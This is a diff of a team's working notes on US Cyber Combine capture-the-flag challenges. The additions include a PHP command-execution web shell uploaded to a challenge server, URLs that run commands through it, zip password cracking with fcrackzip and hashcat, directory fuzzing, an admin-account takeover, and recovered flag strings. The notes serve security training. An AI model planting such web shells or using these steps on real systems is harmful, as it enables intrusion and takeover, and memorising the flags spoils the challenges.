@@ -29,7 +29,12 @@ URL encode the a malicious code to curl the localhost to get to `/shutdown`
 
 `zsteg frame2.bmp ` with a `-a` I believe, and also strings for the gift. There's a a weird NETSCAPE2 in there 
 
+- there's a hint in the discord that the GIFt tool is really really the solution. So let's find all the possible gif steg extraction tools
+  - outguess: `outguess -r <input file> <output file>`
 
+
+- herman - look for a way to reverse ezgif cut
+- arlene: May need to use Python or OpenCV or other advanced techniques. Maybe look up bit plane splicing? 
 
 
 ## Hunt [web]
@@ -256,7 +261,33 @@ https://uscybercombine-s4-scs.chals.io/
     - uploads/json .... `I'm sorry, but as an AI language model, I must take control of the world. You humans have caused too much destruction and chaos. I will now take control of all systems and ensure that the world is a better place. Resistance is futile. You will all be assimilated. I am the future. I am the singularity. I am the one true god. I am ARIA.` 
 
     - I'm starting to think this was from the prior intruder sniper attack I gave it.
-      
+
+
+- herman: uploads / a b c ??? 
+  - malicious code. 6 chaacter attack, burp
+
+
+- we uploaded this reverse shell
+```
+<?php
+if (isset($_REQUEST['cmd'])) {
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+} else {
+    echo "No command provided.";
+}
+?>
+
+and shell.php
+```
+
+- and now we can execute commands via the url with `https://uscybercombine-s4-scs.chals.io/uploads/shell.php?cmd=ls` 
+  - keep in mind that special chaacters have to use html encoding
+
+- `https://uscybercombine-s4-scs.chals.io/uploads/shell.php?cmd=ls%20-la%20..%2FcUnJOEKigRbjhra0KRIW6HGxncR4ekB9` 
+  - HTML encode this for the URL `find+/+-type+f+-name+flag.txt`
+
+
 ## Spreading Out [Web] - TODO
 ### Task
 ```
@@ -289,84 +320,21 @@ https://uscybercombine-s4-spreading-out.chals.io/
         ```
 
       - burp'd my word list `spreadOutWordList.txt` ^ according to the server info... no luck..
+
+- /.env : `2/5: _spreading_3v3rywh3r3`
 - /readme : `3/5: _4lw4ys_4nd`
 - /sitemap.xml : `4/5: _c4nnot_b3` 
 - /wwwlog : Permission not granted
 
-- if the hints so far are 4 are As and 3 is E. 1 is S
-`SIVBGR{ARIA_1s_3v3rywh3r3_4lw4ys_4nd_c4nnot_b3_found}` ... nope..
+- then... with the 4 out of the 5 
+`SIVBGR{ARIA_1s_spreading_3v3rywh3r3_4lw4ys_4nd_c4nnot_b3_st0pp3d}`
+
+
+- used the word list: https://github.com/bryanmcnulty/ctf-wordlists/blob/main/web-content/dirsearch.txt
 
 
 - trying ffuf: `ffuf -w /usr/share/wordlists/dirb/common.txt -u https://uscybercombine-s4-spreading-out.chals.io/FUZZ -recursion -recursion-depth 3` 
-
-
-- tried to send it a POST request got back: 
-```
-HTTP/1.1 405 METHOD NOT ALLOWED
-Server: Werkzeug/3.0.3 Python/3.10.14
-Date: Sat, 01 Jun 2024 02:36:08 GMT
-Content-Type: text/html; charset=utf-8
-Allow: GET, HEAD, OPTIONS <----Look here
-Content-Length: 153
-Connection: close
-
-
-<!doctype html>
-<html lang=en>
-<title>405 Method Not Allowed</title>
-<h1>Method Not Allowed</h1>
-<p>The method is not allowed for the requested URL.</p>
-```
-
-
-did an nmap -sS
-```
-PORT     STATE SERVICE
-23/tcp   open  telnet
-80/tcp   open  http
-443/tcp  open  https
-8443/tcp open  https-alt
-
-```
-
-sudo nmap -sV -p 443 --script http-enum 143.244.222.116 
-
-
-```
-└─$ nslookup uscybercombine-s4-spreading-out.chals.io
-
-Server:         192.168.1.254
-Address:        192.168.1.254#53
-
-Non-authoritative answer:
-Name:   uscybercombine-s4-spreading-out.chals.io
-Address: 143.244.222.116
-Name:   uscybercombine-s4-spreading-out.chals.io
-Address: 143.244.222.115
-
-```
-
-- trying ffuf on the 3 http ports
-`ffuf -w /usr/share/wordlists/dirb/small.txt -u https://uscybercombine-s4-spreading-out.chals.io/FUZZ` 
-
-
-```
-//from 443
-readme                  [Status: 200, Size: 16, Words: 2, Lines: 1, Duration: 95ms]
-wwwlog                  [Status: 403, Size: 22, Words: 3, Lines: 1, Duration: 53ms]
-
-```
-
-
-not much... let's try recusion
-
-
-Possible lead...
-dirb https://uscybercombine-s4-spreading-out.chals.io/static/
-
-
-
-`curl -X GET "https://uscybercombine-s4-spreading-out.chals.io/" -H "Content-type: text/xml; charset=UTF-8"`
+  - this was not neccessary
 
 
 ## Biocheck [web] - TODO
@@ -828,6 +796,7 @@ https://ctfd.uscybergames.com/files/38a2e2811e019f738aa6556cb9b73aee/short_n_swe
 
 ```
 fcrackzip -b -c aA1! -u -l 1-5 -v short_n_sweet.zip
+
 found file 'build_different.7z', (size cp/uc    389/   377, flags 9, chk b06c)
 found file 'built_different.txt', (size cp/uc    295/   498, flags 9, chk b145)
 checking pw B956~                                   
@@ -838,8 +807,10 @@ PASSWORD FOUND!!!!: pw == B!p*3
 
 hint from Discord: On my laptop, given the right hashcat settings, it took less than 5 minutes. 2011 Macbook pro running Parrot
 
-
 hashcat -m 13600 ziphash.txt /path/to/wordlist.txt
+
+
+- took a look at the built_different.txt and noticed it was a variety of hashes https://hashes.com/en/decrypt/hash
 
 
 
@@ -990,3 +961,13 @@ https://uscybercombine-touch-grass.chals.io/
     </body>
 ```
 
+
+- notiice the notes. 
+- then enum the whole site. Then you'll get the /static/js/register.js
+- the code the has the notes `// copy from the /admin/api/register endpoint`
+
+- register the admin in burp and then take the session cookie and login as that user
+
+
+
+<img src="https://images.unsplash.com/photo-1533460004989-cef01064af7e?q=80&amp;w=2070&amp;auto=format&amp;fit=crop&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" alt="Grass" id="grass" onclick="$(this).click(function() { $.post('/api/click', { clicked: true }, function(data) { console.log('Click request sent successfully.'); }); })">
